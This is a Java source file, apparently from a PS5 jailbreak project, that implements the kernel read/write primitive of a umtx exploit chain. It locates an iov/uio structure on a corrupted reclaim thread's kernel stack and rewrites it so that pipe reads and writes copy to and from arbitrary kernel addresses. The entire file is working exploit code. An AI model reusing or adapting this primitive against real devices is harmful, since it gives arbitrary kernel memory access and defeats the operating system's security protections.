package org.ps5jb.client.payloads.umtx.common;

import java.io.IOException;
import java.io.NotActiveException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

import org.ps5jb.loader.KernelAccessor;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.sdk.core.SdkRuntimeException;
import org.ps5jb.sdk.include.UniStd;
import org.ps5jb.sdk.include.machine.Param;
import org.ps5jb.sdk.include.sys.Pipe;
import org.ps5jb.sdk.include.sys.uio.UioType;
import org.ps5jb.sdk.lib.LibKernel;

/**
 * Access kernel memory through a corrupted reclaim thread stack.
 * This class is not thread-safe and is not synchronized on purpose.
 * Care should be taken to request kernel reads from one thread at a time.
 */
public class KernelAccessorSlow implements KernelAccessor {
    private static final long OFFSET_IOV_BASE = 0x00;
    private static final long OFFSET_IOV_LEN = 0x08;
    private static final long SIZE_IOV = 0x10;
    private static final long OFFSET_UIO_RESID = 0x18;
    private static final long OFFSET_UIO_SEGFLG = 0x20;
    private static final long OFFSET_UIO_RW = 0x24;

    private final CommandProcessor commandProcessor;
    private final Pointer kstack;
    private final LibKernel libKernel;
    private long kernelBase;

    public int pipeReadFd;
    public int pipeWriteFd;
    public Pointer pipeScratchBuf;
    public Pointer readValue;
    public Pointer writeValue;

    public KernelAccessorSlow(CommandProcessor commandProcessor, Pointer kstack) throws SdkException {
        this.commandProcessor = commandProcessor;
        this.kstack = kstack;

        this.libKernel = new LibKernel();
        UniStd unistd = new UniStd(libKernel);

        int[] pipeFds = unistd.pipe();
        this.pipeReadFd = pipeFds[0];
        this.pipeWriteFd = pipeFds[1];
        this.pipeScratchBuf = Pointer.calloc(Pipe.BIG_PIPE_SIZE + 8 + 8);
        this.readValue = this.pipeScratchBuf.inc(Pipe.BIG_PIPE_SIZE);
        this.writeValue = this.readValue.inc(8);
    }

    public void free() {
        if (pipeScratchBuf != null) {
            pipeScratchBuf.free();
            pipeScratchBuf = null;
        }

        if (pipeReadFd != -1) {
            libKernel.close(pipeReadFd);
            pipeReadFd = -1;
        }

        if (pipeWriteFd != -1) {
            libKernel.close(pipeWriteFd);
            pipeWriteFd = -1;
        }

        libKernel.closeLibrary();
    }

    private void sendCommand(int cmd, long uaddr, long kaddr, int len) {
        if (DebugStatus.isTraceEnabled()) {
            DebugStatus.trace("Sending command (" + cmd + ", 0x" + Long.toHexString(uaddr) + ", 0x" + Long.toHexString(kaddr) + "), len=" + len + ", read=" + commandProcessor.readCounter.get() + ", write=" + commandProcessor.writeCounter.get());
        }

        // Set args
        commandProcessor.len.set(len);

        // Set command, we do this last because it kickstarts the thread to do stuff
        commandProcessor.cmd.set(cmd);

        // Give some time to the thread to process the command
        sleep(100L);
    }

    private boolean swapIovInKstack(long origIovBase, long newIovBase, int uioSegFlg, int uioRw, int len) {
        if (DebugStatus.isTraceEnabled()) {
            DebugStatus.trace("Searching " + (uioRw == 0 ? "read" : "write") + " iov pattern 0x" + Long.toHexString(origIovBase) + " (" + len + " bytes)");
        }

        // Find iov+uio pair on the stack
        long stack_iov_offset = -1;

        final long scan_start = 0x3000;
        final long scan_max = Param.PAGE_SIZE - UioType.SIZE;
        for (long i = scan_start; i < scan_max; i += 0x4) {
            long possible_iov_base = kstack.read8(i + OFFSET_IOV_BASE);
            long possible_iov_len = kstack.read8(i + OFFSET_IOV_LEN);

            if (possible_iov_base == origIovBase && possible_iov_len == len) {
                long possible_uio_resid = kstack.read8(i + SIZE_IOV + OFFSET_UIO_RESID);
                int possible_uio_segflg = kstack.read4(i + SIZE_IOV + OFFSET_UIO_SEGFLG);
                int possible_uio_rw = kstack.read4(i + SIZE_IOV + OFFSET_UIO_RW);

                if (possible_uio_resid == len && possible_uio_segflg == 0 && possible_uio_rw == uioRw) {
                    if (DebugStatus.isDebugEnabled()) {
                        DebugStatus.debug("found iov on stack @ 0x" + Long.toHexString(i));
                    }
                    stack_iov_offset = i;
                    break;
                }
            }
        }

        if (stack_iov_offset < 0) {
            DebugStatus.trace("iov not found in stack");
            return false;
        }

        // Modify iov for kernel address + r/w
        kstack.write8(stack_iov_offset + OFFSET_IOV_BASE, newIovBase);
        kstack.write4(stack_iov_offset + SIZE_IOV + OFFSET_UIO_SEGFLG, uioSegFlg);
        return true;
    }

    void slowCopyOut(long kaddr, Pointer uaddr, int len) {
        // Fill pipe up to max
        long totalGarbageSize = 0;
        for (long i = 0; i < Pipe.BIG_PIPE_SIZE; i += Param.PHYS_PAGE_SIZE) {
            long writeBytes = libKernel.write(this.pipeWriteFd, this.pipeScratchBuf, Param.PHYS_PAGE_SIZE);
            if (writeBytes != Param.PHYS_PAGE_SIZE) {
                throw new SdkRuntimeException("Unable to fill write pipe with garbage data");
            }
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("Written " + writeBytes + " to pipe fd #" + this.pipeWriteFd);
            }
            totalGarbageSize += writeBytes;
        }
        if (DebugStatus.isTraceEnabled()) {
            DebugStatus.trace("Total garbage bytes " + totalGarbageSize);
        }

        // Signal other thread to write using size we want, the thread will hang until we read
        sendCommand(CommandProcessor.CMD_READ, uaddr.addr(), kaddr, len);

        if (!swapIovInKstack(this.pipeScratchBuf.addr(), kaddr, 1, 1, len)) {
            SdkRuntimeException rootEx = new SdkRuntimeException("Unable to swap iov, pattern not found");
            SdkRuntimeException causeEx = new SdkRuntimeException("Unable to unblock the write pipe following a failed read attempt. Deadlock may occur", rootEx);
            // Unblock the thread
            if (libKernel.read(this.pipeReadFd, this.pipeScratchBuf, totalGarbageSize) != totalGarbageSize) {
                throw causeEx;
            }
            if (libKernel.read(this.pipeReadFd, uaddr, len) != len) {
                throw causeEx;
            }
            throw rootEx;
        }

        // Read garbage filler data
        long readGarbageSize = libKernel.read(this.pipeReadFd, this.pipeScratchBuf, totalGarbageSize);
        if (readGarbageSize != totalGarbageSize) {
            throw new SdkRuntimeException("Unable to unlock the write pipe. Read: " + readGarbageSize + ". Expected: " + totalGarbageSize);
        }
        if (DebugStatus.isTraceEnabled()) {
            DebugStatus.trace("Read " + readGarbageSize + " garbage bytes");
        }

        // Read kernel data
        long read = libKernel.read(this.pipeReadFd, uaddr, len);
        if (read != len) {
            throw new SdkRuntimeException("Unexpected number of bytes read: " + read + " instead of " + len);
        }
        if (DebugStatus.isDebugEnabled()) {
            DebugStatus.debug("Read " + read + " bytes");
        }

        // Wait on reclaim thread to reset
        while (this.commandProcessor.cmd.get() != CommandProcessor.CMD_NOP) {
            sleep(50L);
        }
    }

    void slowCopyIn(Pointer uaddr, long kaddr, int len) {
        // Signal other thread to read using size we want, the thread will hang until we write
        sendCommand(CommandProcessor.CMD_WRITE, uaddr.addr(), kaddr, len);

        if (!swapIovInKstack(this.pipeScratchBuf.addr(), kaddr, 1, 0, len)) {
            SdkRuntimeException rootEx = new SdkRuntimeException("Unable to swap iov, pattern not found");
            SdkRuntimeException causeEx = new SdkRuntimeException("Unable to unblock the read pipe following a failed write attempt. Deadlock may occur", rootEx);
            // Unblock the thread
            if (libKernel.write(this.pipeWriteFd, uaddr, len) != len) {
                throw causeEx;
            }
            throw rootEx;
        }

        // Write data to write to pointer
        long written = libKernel.write(this.pipeWriteFd, uaddr, len);
        if (written != len) {
            throw new SdkRuntimeException("Unexpected number of bytes written: " + written + " instead of " + len);
        }

        // Wait on kprim thread to reset
        while (this.commandProcessor.cmd.get() != CommandProcessor.CMD_NOP) {
            sleep(50L);
        }
    }

    private void sleep(long millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException e) {
            // Ignore
        }
    }

    @Override
    public byte read1(long kernelAddress) {
        slowCopyOut(kernelAddress, this.readValue, 1);
        return this.readValue.read1();
    }

    @Override
    public short read2(long kernelAddress) {
        slowCopyOut(kernelAddress, this.readValue, 2);
        return this.readValue.read2();
    }

    @Override
    public int read4(long kernelAddress) {
        slowCopyOut(kernelAddress, this.readValue, 4);
        return this.readValue.read4();
    }

    @Override
    public long read8(long kernelAddress) {
        slowCopyOut(kernelAddress, this.readValue, 8);
        return this.readValue.read8();
    }

    @Override
    public void write1(long kernelAddress, byte value) {
        this.writeValue.write1(value);
        slowCopyIn(this.writeValue, kernelAddress, 1);
    }

    @Override
    public void write2(long kernelAddress, short value) {
        this.writeValue.write2(value);
        slowCopyIn(this.writeValue, kernelAddress, 2);
    }

    @Override
    public void write4(long kernelAddress, int value) {
        this.writeValue.write4(value);
        slowCopyIn(this.writeValue, kernelAddress, 4);
    }

    @Override
    public void write8(long kernelAddress, long value) {
        this.writeValue.write8(value);
        slowCopyIn(this.writeValue, kernelAddress, 8);
    }

    @Override
    public long getKernelBase() {
        return kernelBase;
    }

    public void setKernelBase(long kernelBase) {
        this.kernelBase = kernelBase;
    }

    public Pointer getKstack() {
        return kstack;
    }

    private void readObject(ObjectInputStream ois) throws ClassNotFoundException, IOException {
        // Do not allow to deserialize this class
        throw new NotActiveException("Slow kernel accessor cannot be restored");
    }

    private void writeObject(ObjectOutputStream oos) throws IOException {
        // Do not allow to serialize this class
        throw new NotActiveException("Slow kernel accessor cannot be saved");
    }
}
